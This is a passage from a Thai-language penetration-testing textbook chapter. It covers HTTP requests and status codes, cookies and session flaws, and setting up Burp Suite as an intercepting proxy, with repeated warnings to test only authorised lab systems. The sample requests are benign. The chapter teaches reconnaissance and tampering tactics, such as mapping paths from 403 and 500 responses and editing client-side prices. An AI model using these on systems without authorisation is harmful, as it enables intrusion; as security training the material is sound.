บทที่ 5 ปิดท้ายด้วยรายการบริการที่ยืนยันแล้วและเส้นทางที่จัดลำดับตามความน่าจะเป็นสำเร็จ ในบรรดาบริการเหล่านั้น บริการเว็บเป็นพื้นที่ที่กว้างและเข้าถึงง่ายที่สุด เพราะมันถูกออกแบบมาให้บุคคลภายนอกเข้าถึงได้โดยไม่ต้องอยู่ในเครือข่ายเดียวกัน พอร์ต 80 และ 443 จึงมักเปิดผ่านไฟร์วอลล์เสมอ ต่างจาก SMB หรือ WinRM ซึ่งควรถูกจำกัดให้อยู่ภายในเท่านั้น

ลักษณะเด่นอีกข้อของเว็บคือมันรับข้อมูลจากผู้ใช้ตลอดเวลา ทั้งช่องกรอก ช่องค้นหา พารามิเตอร์ในที่อยู่ ไฟล์ที่อัปโหลด และคุกกี้ ข้อมูลเหล่านี้ไหลผ่านชั้นซอฟต์แวร์หลายชั้นก่อนถึงฐานข้อมูลและระบบไฟล์ ช่องโหว่ของเว็บจึงมักอยู่ในตรรกะของแอปพลิเคชัน ไม่ได้อยู่ในตัวเซิร์ฟเวอร์ เครื่องมือสแกนอัตโนมัติจึงเห็นได้จำกัด และการทดสอบที่ได้ผลต้องอาศัยการอ่านคำขอจริงประกอบเสมอ

ลำดับของบทจึงเริ่มจากการทำความเข้าใจภาษาที่เว็บใช้สนทนากันก่อน แล้วจึงค่อยหยิบเครื่องมือขึ้นมาใช้ หัวข้อ 6.1 ถึง 6.3 สร้างพื้นฐานสามอย่าง ได้แก่ โครงสร้างของ HTTP การอ่านข้อมูลที่ไหลไปมา และเครื่องมือที่ทำให้อ่านและแก้ไขข้อมูลนั้นได้ หัวข้อ 6.4 ถึง 6.7 ลงมือกับช่องโหว่สี่กลุ่มที่พบบ่อยที่สุดในเว็บรุ่นเก่าและรุ่นใหม่ หัวข้อ 6.8 จึงประกอบทุกส่วนเป็นการทดสอบหนึ่งรอบที่ตรวจสอบย้อนกลับได้

ผู้บรรยายควรย้ำตั้งแต่ต้นว่าการทดลองในบทนี้ทำในระบบที่จัดไว้สำหรับฝึกหรือระบบที่ได้รับอนุญาตเป็นลายลักษณ์อักษรเท่านั้น การอ่านไฟล์ระบบ การเขียนไฟล์ และการสั่งให้เซิร์ฟเวอร์ทำงาน ล้วนเป็นการกระทำที่เปลี่ยนแปลงสภาพของระบบ และอาจเข้าข่ายความผิดทางกฎหมายหากทำกับระบบที่ไม่ได้รับอนุญาต

6.1 HTTP และตำแหน่งที่ช่องโหว่เกิดขึ้น

เหตุใดเว็บจึงเป็นพื้นที่ลงมือแรก

เว็บแอปพลิเคชันคือซอฟต์แวร์ที่ทำงานบนเซิร์ฟเวอร์และให้บริการผ่านโปรโตคอล HTTP ผู้ใช้เข้าถึงด้วยเบราว์เซอร์หรือโปรแกรมอื่นที่พูดภาษาเดียวกันได้ ตัวโปรโตคอลเองเรียบง่าย แต่สิ่งที่นั่งอยู่ข้างหลังกลับซับซ้อน เพราะประกอบด้วยเว็บเซิร์ฟเวอร์ ภาษาฝั่งเซิร์ฟเวอร์ เฟรมเวิร์ก ไลบรารี ฐานข้อมูล และบริการภายนอกที่เชื่อมต่อกันหลายชั้น

ความซับซ้อนนี้เองคือบ่อเกิดของช่องโหว่ ผู้พัฒนาต้องตัดสินใจหลายอย่างในทุกชั้น ตั้งแต่การรับข้อมูล การตรวจสอบความถูกต้อง การเก็บสถานะ ไปจนถึงการส่งข้อมูลกลับ ในแต่ละจุดที่มีการตัดสินใจ มีโอกาสที่ผู้พัฒนาจะเลือกผิด หรือเลือกถูกแต่ตั้งค่าไม่ครบ ผลลัพธ์คือช่องโหว่ที่ไม่ได้เกิดจากความผิดพลาดของภาษาใดภาษาหนึ่ง แต่เกิดจากช่องว่างระหว่างชั้น

อีกเหตุผลหนึ่งคือเว็บเป็นพื้นที่ที่ผู้โจมตีไม่ต้องผ่านการพิสูจน์ตัวตนใดๆ ก่อน การเข้าถึงหน้าแรกของเว็บไม่ต่างจากการเดินผ่านประตูหน้าของอาคาร ผู้โจมตีจึงสามารถสำรวจได้อย่างใจเย็นและเลือกจุดที่อ่อนที่สุดได้เอง ซึ่งต่างจากการโจมตีระบบภายในที่ต้องผ่านหลายชั้นป้องกันก่อน

เส้นทางของคำขอหนึ่งครั้ง

เมื่อผู้ใช้พิมพ์ที่อยู่ในเบราว์เซอร์ เบราว์เซอร์จะแปลงข้อความนั้นเป็นคำขอ HTTP แล้วส่งผ่านการเชื่อมต่อ TCP ไปยังเซิร์ฟเวอร์ หากเป็น HTTPS จะมีชั้น TLS ห่อหุ้มก่อน เซิร์ฟเวอร์เว็บรับคำขอ ส่งต่อให้โปรแกรมที่รับผิดชอบเส้นทางนั้น ประมวลผล และส่งคำตอบกลับมา เบราว์เซอร์จึงตีความคำตอบและแสดงผลเป็นหน้าเว็บ

คำขอแต่ละครั้งเป็นอิสระจากคำขอก่อนหน้า HTTP ไม่ได้จำได้เองว่าใครเป็นใคร ผู้ใช้คนเดิมที่เปิดหน้าถัดไปจึงต้องส่งข้อมูลบางอย่างกลับไปทุกครั้งเพื่อให้เซิร์ฟเวอร์รู้ว่ากำลังคุยกับใคร ข้อมูลนั้นอยู่ในรูปคุกกี้หรือพารามิเตอร์ และเป็นจุดที่ช่องโหว่ด้านการยืนยันตัวตนเกิดขึ้นบ่อยที่สุด

สิ่งที่ผู้ทดสอบต้องเห็นคือคำขอในรูปดิบ ไม่ใช่เพียงหน้าเว็บที่แสดงออกมา เพราะหน้าเว็บเป็นผลลัพธ์สุดท้ายที่ผ่านการตีความหลายรอบแล้ว ข้อมูลที่มีค่าที่สุดมักอยู่ในหัวข้อ ในคุกกี้ หรือในคำตอบที่ซ่อนอยู่เบื้องหลัง ซึ่งเบราว์เซอร์ไม่แสดงให้ผู้ใช้เห็นตามปกติ

ส่วนประกอบของคำขอและคำตอบ

คำขอ HTTP มีโครงสร้างตายตัวสามส่วน คือบรรทัดคำขอ หัวข้อ และตัวข้อมูล บรรทัดคำขอระบุวิธี เส้นทาง และรุ่นของโปรโตคอล ถัดมาคือหัวข้อซึ่งอยู่ในรูปชื่อกับค่า บรรทัดละหนึ่งหัวข้อ และปิดท้ายด้วยบรรทัดว่างเพื่อคั่นก่อนถึงตัวข้อมูล

คำตอบ HTTP มีโครงสร้างคล้ายกัน เริ่มด้วยบรรทัดสถานะซึ่งประกอบด้วยรุ่นโปรโตคอล รหัสตัวเลข และข้อความอธิบายสั้นๆ ตามด้วยหัวข้อ และปิดท้ายด้วยตัวข้อมูลซึ่งอาจเป็น HTML รูปภาพ หรือข้อมูลอื่น

รหัสสถานะเป็นภาษากลางที่บอกผลของคำขอโดยไม่ต้องอ่านตัวข้อมูลทั้งหมด ตัวเลขตัวแรกบอกกลุ่มของรหัส และสองตัวหลังบอกความหมายเฉพาะ การจำกลุ่มให้ได้ช่วยให้อ่านคำตอบเร็วขึ้นมาก

ตาราง 6.3 กลุ่มรหัสสถานะและตัวอย่างที่พบบ่อย
กลุ่มความหมายตัวอย่างที่ควรรู้
1xxรับคำขอแล้ว กำลังดำเนินการต่อ100 Continue, 101 Switching Protocols
2xxสำเร็จ200 OK, 201 Created, 204 No Content
3xxต้องไปที่อื่นต่อ301 Moved Permanently, 302 Found, 304 Not Modified
4xxคำขอมีปัญหา400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 405 Method Not Allowed, 429 Too Many Requests
5xxเซิร์ฟเวอร์มีปัญหา500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable

ในงานทดสอบ รหัสที่ต้องอ่านให้ละเอียดคือ 401 กับ 403 เพราะสองรหัสนี้บอกคนละเรื่อง 401 หมายถึงยังไม่ได้ยืนยันตัวตนหรือยืนยันไม่ผ่าน ส่วน 403 หมายถึงยืนยันตัวตนแล้วแต่ไม่มีสิทธิ์ การเห็น 403 บนเส้นทางหนึ่งจึงเป็นหลักฐานว่าเส้นทางนั้นมีอยู่จริง ซึ่งมีค่าในขั้นการค้นหาเนื้อหา

404 กับ 403 ให้ข้อมูลต่างกันในทำนองเดียวกัน 404 บอกว่าไม่พบสิ่งที่ขอ หากระบบใช้หน้า 404 ที่กำหนดเองเหมือนกันทุกเส้นทาง ก็ยากที่จะแยกออกว่าอะไรมีอยู่จริง แต่ถ้าระบบตอบ 403 ในบางเส้นทาง แสดงว่าเส้นทางนั้นผ่านการตรวจสิทธิ์แล้ว ซึ่งหมายความว่ามันมีอยู่

500 มีค่าอีกแบบหนึ่ง เพราะมันมักมาพร้อมข้อความผิดพลาดที่เปิดเผยเส้นทางไฟล์ ชื่อตัวแปร หรือรายละเอียดของเฟรมเวิร์ก ข้อมูลเหล่านี้อาจไม่ใช่ช่องโหว่โดยตรง แต่เป็นแผนที่ที่บอกผู้ทดสอบว่าควรเจาะตรงไหน

ขอบเขตความไว้วางใจและหลักคิดที่ใช้ตลอดบท

หลักคิดที่สำคัญที่สุดของเว็บคือ ทุกอย่างที่มาจากไคลเอนต์เชื่อถือไม่ได้ ไม่ว่าจะซ่อนอยู่ในช่องกรอกในหน้าเว็บ ซ่อนในตัวแปร JavaScript หรือส่งมาในหัวข้อที่ผู้ใช้มองไม่เห็น การซ่อนไม่ใช่การป้องกัน เพราะผู้ใช้สามารถแก้ไขทุกอย่างที่เบราว์เซอร์ส่งออกไป

เส้นแบ่งนี้เรียกว่าขอบเขตความไว้วางใจ (Trust Boundary) ข้อมูลจะถือว่าเชื่อถือได้ก็ต่อเมื่อผ่านการตรวจสอบที่ฝั่งเซิร์ฟเวอร์แล้วเท่านั้น การตรวจฝั่งไคลเอนต์มีไว้เพื่อความสะดวกของผู้ใช้ ไม่ใช่เพื่อความปลอดภัย

ตัวอย่างที่เห็นภาพง่ายคือฟอร์มสั่งซื้อที่เก็บราคาสินค้าไว้ในช่องซ่อน หากเซิร์ฟเวอร์เชื่อราคาที่ส่งมากลับมา ผู้ใช้ก็เปลี่ยนราคาได้ด้วยการแก้ค่าก่อนส่ง ช่องโหว่ลักษณะนี้ไม่ต้องใช้เครื่องมือพิเศษใดๆ และเครื่องมือสแกนอัตโนมัติก็มองไม่เห็น เพราะคำขอที่ส่งไปนั้นถูกต้องตามรูปแบบทุกประการ

หลักคิดอีกข้อคือการทดสอบเว็บคือการตั้งคำถามกับข้อมูลที่ไหลผ่าน ไม่ใช่การยิงคำขอแปลกๆ ใส่ระบบอย่างสุ่ม ผู้ทดสอบที่ดีจะเห็นก่อนว่าข้อมูลใดไหลจากที่ใดไปที่ใด แล้วจึงคาดเดาว่าจุดใดขาดการตรวจสอบ จุดที่ขาดการตรวจสอบนั่นเองคือจุดที่ควรลอง

ข้อควรระวังในการฝึก

การทดลองในบทนี้บางส่วนอ่านไฟล์ของระบบ บางส่วนเขียนไฟล์ลงในไดเรกทอรีของเว็บ และบางส่วนสั่งให้เซิร์ฟเวอร์ทำงาน การกระทำเหล่านี้ล้วนเปลี่ยนแปลงสภาพของระบบ ระบบฝึกจึงควรเป็นเครื่องเสมือนที่แยกเครือข่ายและสามารถคืนสภาพได้

ก่อนทดสอบทุกครั้งควรจดบันทึกว่าได้ทำอะไรไปบ้าง เพราะหากต้องลบไฟล์ที่อัปโหลดหรือคืนค่าที่แก้ไว้ จะต้องรู้ว่ามีอะไรบ้าง การลืมลบไฟล์ทดสอบไว้ในระบบจริงอาจกลายเป็นช่องโหว่ใหม่ที่อันตรายกว่าต้นฉบับ

ผู้บรรยายควรเน้นอีกเรื่องหนึ่งด้วย นั่นคือการทดสอบกับเว็บไซต์สาธารณะที่ไม่ได้อยู่ในขอบเขตเป็นการกระทำผิดกฎหมายในหลายประเทศ ไม่ว่าจะเพียงแค่อ่านหน้าเว็บหรือส่งคำขอที่ไม่สามารถทำอันตรายได้ก็ตาม การขออนุญาตเป็นลายลักษณ์อักษรจึงเป็นเงื่อนไขแรกของการลงมือทุกครั้ง

6.2 การอ่านคำขอ คำตอบ และการจัดการเซสชัน

อ่านบรรทัดแรกให้ครบ

บรรทัดแรกของคำขอเป็นจุดที่ให้ข้อมูลมากที่สุดในบรรทัดเดียว วิธี (Method) บอกว่าไคลเอนต์ต้องการทำอะไร เส้นทางบอกว่ากำลังพูดกับส่วนใดของแอปพลิเคชัน และส่วนที่ต่อท้ายด้วยเครื่องหมายคำถามคือสายอักขระค้นหา (Query String) ซึ่งบรรจุพารามิเตอร์ที่แอปพลิเคชันจะนำไปใช้

GET /products.php?id=15&sort=price HTTP/1.1
Host: shop.example.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Accept: text/html,application/xhtml+xml
Cookie: PHPSESSID=8f14e45fceea167a5a36dedd4bea2543
Connection: close

คำขอนี้บอกว่าผู้ใช้กำลังขอข้อมูลสินค้าหมายเลข 15 และต้องการเรียงตามราคา ข้อมูลสองค่านี้ถูกส่งไปในที่อยู่ ซึ่งหมายความว่ามันจะปรากฏในประวัติเบราว์เซอร์ ในไฟล์บันทึกของเซิร์ฟเวอร์ และในหัวข้อ Referer ของหน้าถัดไปหากผู้ใช้คลิกลิงก์ การใช้วิธี GET กับข้อมูลที่ไม่ใช่ความลับจึงสำคัญ แต่การใช้งานจริงกลับพบการส่งข้อมูลอ่อนไหวด้วยวิธีนี้อยู่เสมอ

POST /login.php HTTP/1.1
Host: shop.example.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: PHPSESSID=8f14e45fceea167a5a36dedd4bea2543
Connection: close

username=alice&password=secret

คำขอแบบ POST ส่งข้อมูลในตัวข้อมูลแทนที่จะอยู่ในที่อยู่ รูปแบบของตัวข้อมูลบอกไว้ในหัวข้อ Content-Type และขนาดบอกไว้ในหัวข้อ Content-Length ค่าของขนาดนับเป็นไบต์ ไม่ใช่จำนวนตัวอักษร ความแตกต่างนี้สำคัญเมื่อข้อมูลมีอักษรไทยหรืออักขระหลายไบต์ เพราะการนับผิดจะทำให้เซิร์ฟเวอร์อ่านข้อมูลไม่ครบหรือค้างรอข้อมูลเพิ่ม

หัวข้อที่บอกบริบท

หัวข้อจำนวนมากมีหน้าที่บอกบริบทของคำขอ ไม่ได้เกี่ยวกับเนื้อหาหลักโดยตรง แต่กลับมีประโยชน์ในการทดสอบ เพราะมันเผยให้เห็นสถาปัตยกรรมและพฤติกรรมของแอปพลิเคชัน

ตาราง 6.4 หัวข้อที่ควรอ่านบ่อยและสิ่งที่มันบอก
หัวข้ออยู่ฝั่งสิ่งที่บอก
Hostคำขอโดเมนที่ต้องการ บนเซิร์ฟเวอร์ที่รับหลายโดเมนค่านี้เป็นตัวเลือกเว็บที่จะตอบ
User-Agentคำขอเบราว์เซอร์และระบบปฏิบัติการ และมักถูกบันทึกในไฟล์เหตุการณ์
Refererคำขอหน้าที่ลิงก์มา ใช้ตรวจตรรกะการเปลี่ยนหน้าได้
Originคำขอต้นทางของคำขอข้ามโดเมน เกี่ยวข้องกับการป้องกันการปลอมคำขอ
Cookieคำขอข้อมูลสถานะที่ไคลเอนต์เก็บไว้และส่งกลับมาทุกครั้ง
Authorizationคำขอข้อมูลรับรอง เช่น โทเคนแบบ Bearer
Content-Typeทั้งสองฝั่งรูปแบบของข้อมูล ใช้ตรวจการอัปโหลดและรูปแบบข้อมูลป้อนเข้า
X-Forwarded-Forคำขอหมายเลขไคลเอนต์เมื่อผ่านพร็อกซี ซึ่งปลอมได้ง่าย
Serverคำตอบซอฟต์แวร์เว็บเซิร์ฟเวอร์และรุ่น
Set-Cookieคำตอบคำสั่งให้ไคลเอนต์เก็บคุกกี้พร้อมคุณสมบัติ
Locationคำตอบปลายทางของการเปลี่ยนหน้า
Content-Security-Policyคำตอบนโยบายว่าแหล่งสคริปต์ใดได้รับอนุญาต
X-Frame-Optionsคำตอบป้องกันการฝังหน้าเว็บไว้ในกรอบของเว็บอื่น

หัวข้อที่ผู้พัฒนาสร้างเองมักขึ้นต้นด้วย X- และบอกข้อมูลที่ไม่มีในมาตรฐาน เช่น รุ่นของเฟรมเวิร์ก ชื่อบริการหลังบ้าน หรือหมายเลขเครื่องที่ประมวลผลคำขอนั้น การเห็นหัวข้อเหล่านี้ไม่ได้หมายความว่ามีช่องโหว่ แต่ช่วยให้ผู้ทดสอบเข้าใจว่าแอปพลิเคชันประกอบจากอะไร และควรค้นหาช่องโหว่ประเภทใด

หัวข้อ Server และ X-Powered-By เป็นตัวอย่างที่พบได้บ่อย แต่ก็เป็นสิ่งที่ผู้ดูแลระบบมักปิดหรือแก้ไขแล้ว การไม่เห็นข้อมูลเหล่านี้จึงไม่ได้แปลว่าไม่มีอะไรซ่อนอยู่ และการเห็นข้อมูลเหล่านี้ก็ยังต้องยืนยันด้วยวิธีอื่นตามที่บทที่ 5 อธิบายไว้

อ่านคำตอบให้เห็นสิ่งที่ซ่อนอยู่

คำตอบที่ดีต่อการทดสอบไม่ใช่คำตอบที่สวยงาม แต่เป็นคำตอบที่เผยสิ่งที่ผู้พัฒนาไม่ได้ตั้งใจให้เห็น ข้อความผิดพลาดที่ยังไม่ถูกปิดคือแหล่งข้อมูลชั้นดี เพราะมันมักบอกเส้นทางไฟล์ ชื่อตัวแปร ชื่อตาราง และรุ่นของไลบรารี

HTTP/1.1 500 Internal Server Error
Server: Apache/2.4.52 (Ubuntu)
Content-Type: text/html; charset=UTF-8

Warning: include(/var/www/shop/includes/header.php): failed to open stream:
No such file or directory in /var/www/shop/index.php on line 12

คำตอบข้างต้นบอกเส้นทางเต็มของไฟล์ หมายเลขบรรทัด และกลไกที่ใช้ รวมถึงยืนยันว่าเซิร์ฟเวอร์ใช้ PHP บน Apache ข้อมูลเหล่านี้ช่วยให้ผู้ทดสอบคาดเดาโครงสร้างไดเรกทอรีและเลือกเส้นทางสำหรับการทดสอบขั้นถัดไปได้แม่นยำขึ้น

อีกรูปแบบที่ควรสังเกตคือการตอบ 200 OK พร้อมเนื้อหาที่เป็นข้อความผิดพลาดหรือหน้าเข้าสู่ระบบ การดูเพียงรหัสสถานะจึงไม่พอ เพราะแอปพลิเคชันจำนวนมากจัดการข้อผิดพลาดเองแล้วส่งหน้ากลับมาพร้อมรหัส 200 เสมอ ผู้ทดสอบจึงต้องอ่านเนื้อหาประกอบทุกครั้ง

คุกกี้คือกลไกจดจำสถานะ

เมื่อเซิร์ฟเวอร์ต้องการให้ไคลเอนต์จดจำบางอย่าง มันจะส่งหัวข้อ Set-Cookie กลับมา เบราว์เซอร์เก็บค่านั้นไว้และแนบกลับไปในทุกคำขอถัดไปที่ตรงกับเงื่อนไขของคุกกี้ กลไกนี้ทำให้ผู้ใช้ไม่ต้องล็อกอินใหม่ในทุกหน้า

Set-Cookie: PHPSESSID=8f14e45fceea167a5a36dedd4bea2543; Path=/; HttpOnly; SameSite=Lax

ค่าข้างต้นยาว 32 ตัวอักษรฐานสิบหก ซึ่งเทียบเท่ากับ 16 ไบต์หรือ 128 บิต ความยาวระดับนี้ทำให้การเดาค่าเป็นไปไม่ได้ในทางปฏิบัติหากสร้างด้วยตัวสร้างเลขสุ่มที่เหมาะสม แต่ระบบที่สร้างค่าจากเวลา หมายเลขลำดับ หรือข้อมูลผู้ใช้ จะให้ค่าที่คาดเดาได้แม้จะดูยาวก็ตาม

ตาราง 6.5 คุณสมบัติของคุกกี้และผลต่อความปลอดภัย
คุณสมบัติตัวอย่างผล
ชื่อและค่าPHPSESSID=8f14...ข้อมูลที่ไคลเอนต์เก็บและส่งกลับ
DomainDomain=example.localกำหนดโดเมนและโดเมนย่อยที่เข้าถึงคุกกี้ได้
PathPath=/appจำกัดเส้นทางที่คุกกี้จะถูกส่งไป
Expires หรือ Max-AgeMax-Age=3600กำหนดอายุ หากไม่ระบุจะหมดเมื่อปิดเบราว์เซอร์
SecureSecureส่งคุกกี้เฉพาะผ่าน HTTPS
HttpOnlyHttpOnlyสคริปต์ในหน้าเว็บอ่านค่านี้ไม่ได้
SameSiteSameSite=Laxจำกัดการส่งคุกกี้เมื่อคำขอมาจากเว็บอื่น

คุณสมบัติ HttpOnly ไม่ได้ป้องกันการขโมยคุกกี้ทุกวิธี แต่ปิดช่องทางที่พบบ่อยที่สุดคือการอ่านผ่านสคริปต์ที่ฝังอยู่ในหน้า ส่วน Secure ป้องกันการส่งคุกกี้ผ่านการเชื่อมต่อที่ไม่เข้ารหัส ซึ่งสำคัญมากในเครือข่ายที่มีผู้ดักฟัง

SameSite มีสามค่า ได้แก่ Strict ซึ่งไม่ส่งคุกกี้เมื่อคำขอมาจากเว็บอื่นเลย Lax ซึ่งส่งในบางกรณี เช่น การคลิกลิงก์ปกติ และ None ซึ่งส่งทุกกรณีแต่ต้องมาคู่กับ Secure เสมอ การตั้งค่า None โดยไม่มี Secure จะถูกเบราว์เซอร์สมัยใหม่ปฏิเสธ

เมื่อเซสชันมีข้อบกพร่อง

เซสชันคือการที่เซิร์ฟเวอร์จำได้ว่าคำขอหลายครั้งมาจากผู้ใช้คนเดียวกัน ตัวระบุเซสชัน (Session ID) คือกุญแจของความจำนั้น หากผู้โจมตีได้ค่านั้นไป ก็ไม่ต้องรู้รหัสผ่านอีกต่อไป เพราะระบบจะมองว่าเขาเป็นผู้ใช้คนนั้นแล้ว

ข้อบกพร่องด้านเซสชันจึงมีผลกระทบสูงแม้จะดูเป็นเรื่องเทคนิคเล็กๆ ตารางถัดไปสรุปข้อบกพร่องที่พบบ่อยและอาการที่สังเกตได้

ตาราง 6.6 ข้อบกพร่องของการจัดการเซสชัน
ข้อบกพร่องอาการที่สังเกตได้ผลกระทบ
ตัวระบุเดาง่ายค่าสั้น เป็นลำดับ หรืออิงเวลาคาดเดาเซสชันของผู้อื่นได้
ไม่เปลี่ยนหลังเข้าสู่ระบบค่าเดิมก่อนและหลังล็อกอินผู้ที่รู้ค่าก่อนหน้าสามารถใช้ต่อได้
ไม่หมดอายุใช้ได้แม้ปิดเบราว์เซอร์ไปนานเซสชันที่ถูกละทิ้งกลายเป็นประตูถาวร
ออกจากระบบไม่ทำลายคำขอยังใช้ได้หลังกดออกโทเคนที่ถูกขโมยยังใช้ได้

ไม่ผูกกับบริบทใช้ได้จากหมายเลขและเครื่องอื่นลดชั้นป้องกันเมื่อค่าถูกขโมย

การตรวจข้อบกพร่องเหล่านี้ทำได้โดยไม่ต้องโจมตีใคร เพียงสังเกตพฤติกรรมของระบบตัวเองในบัญชีทดสอบ เริ่มจากการเข้าสู่ระบบสองครั้งด้วยบัญชีเดียวกัน แล้วเทียบค่าที่ได้ หากค่าเหมือนเดิมทุกครั้งและไม่เปลี่ยนหลังล็อกอิน นั่นคือสัญญาณที่ต้องบันทึกไว้

จากนั้นให้ทดสอบการออกจากระบบ แล้วนำค่าที่ได้ก่อนออกมาใช้ซ้ำ หากยังใช้งานได้ แสดงว่าเซสชันไม่ได้ถูกทำลายจริง การทดสอบนี้ต้องทำในบัญชีของตัวเองเท่านั้น การนำค่าของผู้อื่นมาใช้แม้ในระบบฝึกถือเป็นการฝ่าฝืนจริยธรรมและอาจผิดกฎหมาย

ข้อผิดพลาดในการอ่านที่พบบ่อย

ข้อผิดพลาดข้อแรกคือดูเฉพาะหน้าเว็บและไม่ดูคำขอ ผู้เริ่มต้นมักสรุปว่าแอปพลิเคชันไม่รับพารามิเตอร์ใดๆ เพราะหน้าเว็บไม่มีช่องกรอก แต่ความจริงคือข้อมูลอาจถูกส่งผ่านคุกกี้ หัวข้อ หรือเส้นทางที่ซ่อนอยู่

ข้อผิดพลาดข้อที่สองคือเชื่อรหัสสถานะเพียงอย่างเดียว ดังที่กล่าวไว้แล้วว่าแอปพลิเคชันจำนวนมากตอบ 200 พร้อมหน้าแสดงข้อผิดพลาด การอ่านเนื้อหาประกอบจึงเป็นกิจนิสัยที่ต้องสร้าง

ข้อผิดพลาดข้อที่สามคือสรุปว่าเซสชันปลอดภัยเพราะค่ายาวและดูสุ่ม การดูความยาวไม่พอ ต้องดูพฤติกรรมด้วยว่าเปลี่ยนเมื่อใด หมดอายุหรือไม่ และถูกทำลายเมื่อออกจากระบบหรือยัง

ข้อผิดพลาดข้อที่สี่คือลืมว่าคุกกี้เป็นเพียงข้อมูลที่ไคลเอนต์เก็บไว้ ผู้ใช้สามารถแก้ไขค่าคุกกี้ได้ด้วยเครื่องมือในเบราว์เซอร์หรือพร็อกซี ดังนั้นการเก็บข้อมูลสำคัญ เช่น ราคาสินค้าหรือระดับสิทธิ์ ไว้ในคุกกี้โดยไม่ตรวจสอบฝั่งเซิร์ฟเวอร์ จึงเป็นช่องโหว่ที่รอการค้นพบ

6.3 การใช้ Burp Suite เป็นเครื่องมือหลัก

เหตุใดต้องมีตัวกลาง

การทดสอบเว็บด้วยเบราว์เซอร์เพียงอย่างเดียวมีข้อจำกัดพื้นฐานสามข้อ ข้อแรกคือเบราว์เซอร์ไม่ยอมให้ผู้ใช้แก้ไขคำขอก่อนส่ง ข้อที่สองคือเมื่อส่งคำขอไปแล้ว จะส่งซ้ำพร้อมการแก้ไขเล็กๆ น้อยๆ ได้ยาก และข้อที่สามคือผู้ใช้มองไม่เห็นคำขอและคำตอบในรูปดิบ

Burp Suite แก้ข้อจำกัดทั้งสามข้อด้วยการทำตัวเป็นพร็อกซีแบบดักจับ (Intercepting Proxy) คือยืนอยู่ระหว่างเบราว์เซอร์กับเซิร์ฟเวอร์ ทุกคำขอที่เบราว์เซอร์ส่งจะผ่าน Burp ก่อน และทุกคำตอบก็ผ่านกลับมาในทางเดียวกัน ผู้ใช้จึงเห็นทุกอย่างที่ไหลผ่าน และแก้ไขได้ก่อนส่งต่อ

การวางตัวเป็นพร็อกซีมีผลข้างเคียงที่ต้องเข้าใจ Burp เห็นเฉพาะการเชื่อมต่อที่ถูกตั้งให้ผ่านมันเท่านั้น หากเบราว์เซอร์ไม่ได้ตั้งพร็อกซี คำขอจะวิ่งตรงไปยังเซิร์ฟเวอร์และ Burp จะไม่เห็นอะไรเลย การตั้งค่าเบราว์เซอร์จึงเป็นขั้นตอนที่ขาดไม่ได้

การตั้งค่าเริ่มต้น

ขั้นตอนการตั้งค่ามีลำดับที่ชัดเจน และความผิดพลาดส่วนใหญ่เกิดจากการข้ามขั้นใดขั้นหนึ่ง ตารางถัดไปสรุปขั้นตอนที่ควรทำทุกครั้งเมื่อเริ่มงานใหม่

ตาราง 6.7 ขั้นตอนเตรียม Burp Suite ก่อนเริ่มทดสอบ
ลำดับสิ่งที่ทำจุดที่ควรตรวจ
1เปิด Burp และตรวจพร็อกซี listenerทำงานที่ 127.0.0.1:8080 ตามค่าปริยาย
2ตั้งเบราว์เซอร์ให้ใช้พร็อกซีเดียวกันหมายเลขและพอร์ตตรงกับ listener
3เปิดที่อยู่ http://burp เพื่อดาวน์โหลดใบรับรองได้ไฟล์ CA ของ Burp
4ติดตั้งใบรับรองเป็น trusted rootติดตั้งในที่เก็บของเบราว์เซอร์ที่ใช้
5ตั้ง Target scope ให้ตรงขอบเขตงานรายการโดเมนและหมายเลขที่ระบุในสัญญา
6ปิด intercept ขณะสำรวจเว็บเปิดเมื่อต้องการแก้คำขอทีละรายการ
7ทดสอบด้วยหน้าเว็บธรรมดาหนึ่งหน้าเห็นคำขอใน HTTP history

ขั้นที่สามและสี่เป็นขั้นที่ผู้เริ่มต้นข้ามบ่อยที่สุด หากไม่ได้ติดตั้งใบรับรอง เบราว์เซอร์จะเตือนว่าใบรับรองไม่น่าเชื่อถือทุกครั้งที่เปิดเว็บผ่าน HTTPS และคุณสมบัติบางอย่างจะทำงานไม่สมบูรณ์ การติดตั้งครั้งเดียวจบทำให้ทดสอบได้ราบรื่นตลอดงาน

ข้อควรระวังคือใบรับรองนี้ทำให้ Burp สามารถอ่านเนื้อหาของการเชื่อมต่อที่เข้ารหัสได้ ซึ่งเป็นสิ่งที่ต้องการในงานทดสอบ แต่ก็หมายความว่าผู้ที่เข้าถึงเครื่องของผู้ทดสอบอาจใช้ใบรับรองเดียวกันนี้แทรกกลางได้ จึงควรติดตั้งเฉพาะในโปรไฟล์เบราว์เซอร์ที่ใช้ทดสอบ ไม่ใช่โปรไฟล์ที่ใช้ทำงานประจำ

องค์ประกอบที่ใช้บ่อย

Burp มีเครื่องมือหลายส่วน แต่ในบทนี้ใช้องค์ประกอบหลักเพียงไม่กี่อย่าง การรู้จักส่วนเหล่านี้ให้ดีมีค่ากว่าการรู้จักทุกส่วนแบบผิวเผิน

ตาราง 6.8 องค์ประกอบของ Burp Suite ที่ใช้ในบทนี้
องค์ประกอบหน้าที่ใช้เมื่อใด
Proxyดักจับและส่งต่อคำขอทั้งหมดต้องการเห็นทุกคำขอที่เบราว์เซอร์ส่งออกไป
Interceptหยุดคำขอไว้ให้แก้ก่อนส่งต่อต้องการแก้ค่าเดียวแล้วดูผลทันที
HTTP historyเก็บรายการคำขอและคำตอบที่ผ่านมาย้อนดูหรือส่งคำขอเดิมไปทดสอบต่อ
Repeaterส่งคำขอเดิมซ้ำพร้อมแก้ไขทดลองค่าพารามิเตอร์และเทียบคำตอบ
Intruderส่งคำขอหลายรูปแบบโดยอัตโนมัติทดสอบรายการคำหรือชุดข้อมูล ซึ่งรุ่นชุมชนจำกัดความเร็ว
Decoderเข้ารหัสและถอดรหัสข้อมูลแปลงค่าที่ต้องส่งในรูปแบบพิเศษ
Comparerเทียบคำตอบสองชุดหาความแตกต่างเล็กๆ ที่มีความหมาย
Scopeกำหนดเป้าหมายของงานใช้กรองประวัติและเตือนสติผู้ทดสอบ

